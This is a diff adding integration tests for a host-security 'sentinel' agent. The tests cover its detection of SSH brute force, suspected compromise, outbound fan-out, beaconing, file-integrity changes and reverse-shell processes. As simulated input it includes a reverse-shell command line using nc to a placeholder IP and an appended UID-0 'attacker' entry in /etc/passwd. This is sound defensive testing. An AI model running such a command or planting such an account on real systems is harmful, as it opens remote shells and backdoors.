@@ -175,6 +175,249 @@ describe('sentinel() against a real CommandCentre backend', () => {
     expect(blockIp).toHaveBeenCalledWith('203.0.113.77');
   });
 
+  it('detects an SSH brute-force pattern from real auth-log lines and blocks it once active', async () => {
+    const issued = await api(`/security/applications/${assetId}/sentinel-key`, { method: 'POST' });
+    const sentinelKey = issued.body.sentinelKey;
+    await api(`/security/applications/${assetId}/sentinel-heartbeat`, { method: 'POST', key: sentinelKey, body: {} });
+    await api(`/security/applications/${assetId}/sentinel-mode`, { method: 'PATCH', body: { mode: 'active' } });
+
+    const bruteForceLines = Array.from(
+      { length: 6 },
+      (_, i) => `sshd[100${i}]: Failed password for invalid user admin from 203.0.113.201 port 5${i}000 ssh2`,
+    );
+    const blockIp = vi.fn().mockResolvedValue(undefined);
+
+    const instance = sentinel({
+      assetId,
+      sentinelKey,
+      commandCentreUrl: apiBaseUrl,
+      heartbeatIntervalMs: 100_000,
+      commandPollIntervalMs: 100_000,
+      scanCheckIntervalMs: 100_000,
+      authLogCheckIntervalMs: 100_000,
+      authFailureThreshold: 5,
+      firewall: { blockIp, unblockIp: vi.fn(), listBlockedIps: vi.fn() },
+      readOpenPorts: () => [],
+      readConnections: () => [],
+      readAuthLines: () => Promise.resolve(bruteForceLines),
+    });
+
+    await new Promise((resolve) => setTimeout(resolve, 300));
+    instance.stop();
+
+    expect(blockIp).toHaveBeenCalledWith('203.0.113.201');
+
+    // A real block (blocked: true) sets requiresManualConfirmation: false,
+    // which auto-creates a ticket and moves the finding straight to
+    // 'investigating' — it never sits in 'new' once it's already contained.
+    const findings = await api('/security/findings?status=investigating');
+    const bruteFinding = findings.body.find((f) => f.category === 'brute_force_ssh' && f.affectedAssetRef === '10.0.0.1');
+    expect(bruteFinding).toBeTruthy();
+  });
+
+  it('flags a successful login that followed recent failed SSH attempts as a suspected compromise', async () => {
+    const issued = await api(`/security/applications/${assetId}/sentinel-key`, { method: 'POST' });
+    const sentinelKey = issued.body.sentinelKey;
+    await api(`/security/applications/${assetId}/sentinel-heartbeat`, { method: 'POST', key: sentinelKey, body: {} });
+
+    let poll = 0;
+    const readAuthLines = () => {
+      poll += 1;
+      if (poll === 1) {
+        return Promise.resolve([
+          'sshd[1]: Failed password for root from 203.0.113.202 port 51001 ssh2',
+          'sshd[2]: Failed password for root from 203.0.113.202 port 51002 ssh2',
+        ]);
+      }
+      if (poll === 2) {
+        return Promise.resolve(['sshd[3]: Accepted password for root from 203.0.113.202 port 51003 ssh2']);
+      }
+      return Promise.resolve([]);
+    };
+
+    const instance = sentinel({
+      assetId,
+      sentinelKey,
+      commandCentreUrl: apiBaseUrl,
+      heartbeatIntervalMs: 100_000,
+      commandPollIntervalMs: 100_000,
+      scanCheckIntervalMs: 100_000,
+      authLogCheckIntervalMs: 100,
+      authFailureThreshold: 10, // stays below brute-force threshold; only the compromise signal should fire
+      firewall: { blockIp: vi.fn(), unblockIp: vi.fn(), listBlockedIps: vi.fn() },
+      readOpenPorts: () => [],
+      readConnections: () => [],
+      readAuthLines,
+    });
+
+    await new Promise((resolve) => setTimeout(resolve, 400));
+    instance.stop();
+
+    const findings = await api('/security/findings?status=new');
+    const compromiseFinding = findings.body.find(
+      (f) => f.category === 'ssh_compromise_suspected' && f.affectedAssetRef === '10.0.0.1',
+    );
+    expect(compromiseFinding).toBeTruthy();
+    expect(compromiseFinding.severity).toBe('critical');
+  });
+
+  it('detects outbound fan-out to many distinct destinations and reports it without blocking', async () => {
+    const issued = await api(`/security/applications/${assetId}/sentinel-key`, { method: 'POST' });
+    const sentinelKey = issued.body.sentinelKey;
+    await api(`/security/applications/${assetId}/sentinel-heartbeat`, { method: 'POST', key: sentinelKey, body: {} });
+    await api(`/security/applications/${assetId}/sentinel-mode`, { method: 'PATCH', body: { mode: 'active' } });
+
+    const fanOutConnections = Array.from({ length: 30 }, (_, i) => ({
+      remoteIp: `203.0.113.${i}`, remotePort: 443, localIp: '10.0.0.1', localPort: 54000 + i,
+    }));
+
+    const instance = sentinel({
+      assetId,
+      sentinelKey,
+      commandCentreUrl: apiBaseUrl,
+      heartbeatIntervalMs: 100_000,
+      commandPollIntervalMs: 100_000,
+      scanCheckIntervalMs: 100_000,
+      authLogCheckIntervalMs: 100_000,
+      outboundCheckIntervalMs: 100_000,
+      firewall: { blockIp: vi.fn(), unblockIp: vi.fn(), listBlockedIps: vi.fn(), blockOutboundIp: vi.fn(), unblockOutboundIp: vi.fn() },
+      readOpenPorts: () => [],
+      readConnections: () => [],
+      readAuthLines: () => Promise.resolve([]),
+      readOutboundConnections: () => fanOutConnections,
+    });
+
+    await new Promise((resolve) => setTimeout(resolve, 300));
+    instance.stop();
+
+    const findings = await api('/security/findings?status=new');
+    const fanOutFinding = findings.body.find((f) => f.category === 'outbound_fanout' && f.affectedAssetRef === '10.0.0.1');
+    expect(fanOutFinding).toBeTruthy(); // report-only (requiresManualConfirmation stays true) even though mode is active
+  });
+
+  it('detects periodic outbound beaconing and isolates the destination once active', async () => {
+    const issued = await api(`/security/applications/${assetId}/sentinel-key`, { method: 'POST' });
+    const sentinelKey = issued.body.sentinelKey;
+    await api(`/security/applications/${assetId}/sentinel-heartbeat`, { method: 'POST', key: sentinelKey, body: {} });
+    await api(`/security/applications/${assetId}/sentinel-mode`, { method: 'PATCH', body: { mode: 'active' } });
+
+    const blockOutboundIp = vi.fn().mockResolvedValue(undefined);
+    let poll = 0;
+    const beaconConn = { remoteIp: '198.51.100.66', remotePort: 8443, localIp: '10.0.0.1', localPort: 55000 };
+
+    const instance = sentinel({
+      assetId,
+      sentinelKey,
+      commandCentreUrl: apiBaseUrl,
+      heartbeatIntervalMs: 100_000,
+      commandPollIntervalMs: 100_000,
+      scanCheckIntervalMs: 100_000,
+      authLogCheckIntervalMs: 100_000,
+      outboundCheckIntervalMs: 50,
+      outboundWindowMs: 10 * 60_000,
+      firewall: { blockIp: vi.fn(), unblockIp: vi.fn(), listBlockedIps: vi.fn(), blockOutboundIp, unblockOutboundIp: vi.fn() },
+      readOpenPorts: () => [],
+      readConnections: () => [],
+      readAuthLines: () => Promise.resolve([]),
+      // Every poll "sees" the same destination again — real regular check-in traffic.
+      readOutboundConnections: () => { poll += 1; return poll <= 5 ? [beaconConn] : []; },
+    });
+
+    await new Promise((resolve) => setTimeout(resolve, 400));
+    instance.stop();
+
+    expect(blockOutboundIp).toHaveBeenCalledWith('198.51.100.66');
+
+    const findings = await api('/security/findings?status=investigating');
+    const beaconFinding = findings.body.find((f) => f.category === 'outbound_beaconing' && f.affectedAssetRef === '10.0.0.1');
+    expect(beaconFinding).toBeTruthy();
+  });
+
+  it('detects a modified watched file and reports it as a file-integrity finding', async () => {
+    const issued = await api(`/security/applications/${assetId}/sentinel-key`, { method: 'POST' });
+    const sentinelKey = issued.body.sentinelKey;
+    await api(`/security/applications/${assetId}/sentinel-heartbeat`, { method: 'POST', key: sentinelKey, body: {} });
+
+    let content = 'root:x:0:0:root:/root:/bin/bash\n';
+    const instance = sentinel({
+      assetId,
+      sentinelKey,
+      commandCentreUrl: apiBaseUrl,
+      heartbeatIntervalMs: 100_000,
+      commandPollIntervalMs: 100_000,
+      scanCheckIntervalMs: 100_000,
+      authLogCheckIntervalMs: 100_000,
+      outboundCheckIntervalMs: 100_000,
+      fimCheckIntervalMs: 100,
+      watchedPaths: ['/etc/passwd'],
+      readWatchedFile: () => content,
+      firewall: { blockIp: vi.fn(), unblockIp: vi.fn(), listBlockedIps: vi.fn(), blockOutboundIp: vi.fn(), unblockOutboundIp: vi.fn() },
+      readOpenPorts: () => [],
+      readConnections: () => [],
+      readAuthLines: () => Promise.resolve([]),
+      readOutboundConnections: () => [],
+    });
+
+    await new Promise((resolve) => setTimeout(resolve, 150)); // first tick: establishes baseline, no finding yet
+    content = 'root:x:0:0:root:/root:/bin/bash\nattacker:x:0:0::/root:/bin/bash\n'; // a new UID-0 line appended
+    await new Promise((resolve) => setTimeout(resolve, 250)); // second tick: should detect the change
+    instance.stop();
+
+    const findings = await api('/security/findings?status=new');
+    const fimFinding = findings.body.find((f) => f.category === 'file_integrity_violation' && f.affectedAssetRef === '10.0.0.1');
+    expect(fimFinding).toBeTruthy();
+    expect(fimFinding.severity).toBe('high');
+  });
+
+  it('detects a new process matching a reverse-shell pattern and reports it', async () => {
+    const issued = await api(`/security/applications/${assetId}/sentinel-key`, { method: 'POST' });
+    const sentinelKey = issued.body.sentinelKey;
+    await api(`/security/applications/${assetId}/sentinel-heartbeat`, { method: 'POST', key: sentinelKey, body: {} });
+
+    const pidMap = { current: { 100: { cmdline: 'node server.js', exePath: '/usr/bin/node' } } };
+    const processReaders = {
+      readdir: () => Object.keys(pidMap.current),
+      readFileText: (path) => {
+        const pid = path.match(/\/proc\/(\d+)\/cmdline/)[1];
+        return pidMap.current[pid].cmdline.split(' ').join('\0') + '\0';
+      },
+      readlink: (path) => {
+        const pid = path.match(/\/proc\/(\d+)\/exe/)[1];
+        if (!pidMap.current[pid].exePath) throw new Error('EACCES');
+        return pidMap.current[pid].exePath;
+      },
+    };
+
+    const instance = sentinel({
+      assetId,
+      sentinelKey,
+      commandCentreUrl: apiBaseUrl,
+      heartbeatIntervalMs: 100_000,
+      commandPollIntervalMs: 100_000,
+      scanCheckIntervalMs: 100_000,
+      authLogCheckIntervalMs: 100_000,
+      outboundCheckIntervalMs: 100_000,
+      fimCheckIntervalMs: 100_000,
+      processCheckIntervalMs: 100,
+      processReaders,
+      firewall: { blockIp: vi.fn(), unblockIp: vi.fn(), listBlockedIps: vi.fn(), blockOutboundIp: vi.fn(), unblockOutboundIp: vi.fn() },
+      readOpenPorts: () => [],
+      readConnections: () => [],
+      readAuthLines: () => Promise.resolve([]),
+      readOutboundConnections: () => [],
+    });
+
+    await new Promise((resolve) => setTimeout(resolve, 150)); // first tick: baseline only
+    pidMap.current[666] = { cmdline: 'nc -e /bin/sh 203.0.113.5 4444' }; // simulated reverse shell spawn
+    await new Promise((resolve) => setTimeout(resolve, 250));
+    instance.stop();
+
+    const findings = await api('/security/findings?status=new');
+    const processFinding = findings.body.find((f) => f.category === 'suspicious_process' && f.affectedAssetRef === '10.0.0.1');
+    expect(processFinding).toBeTruthy();
+    expect(processFinding.severity).toBe('critical');
+  });
+
   it('executes a manually-queued block_ip command from the operator UI via the real command-poll loop', async () => {
     const issued = await api(`/security/applications/${assetId}/sentinel-key`, { method: 'POST' });
     const sentinelKey = issued.body.sentinelKey;
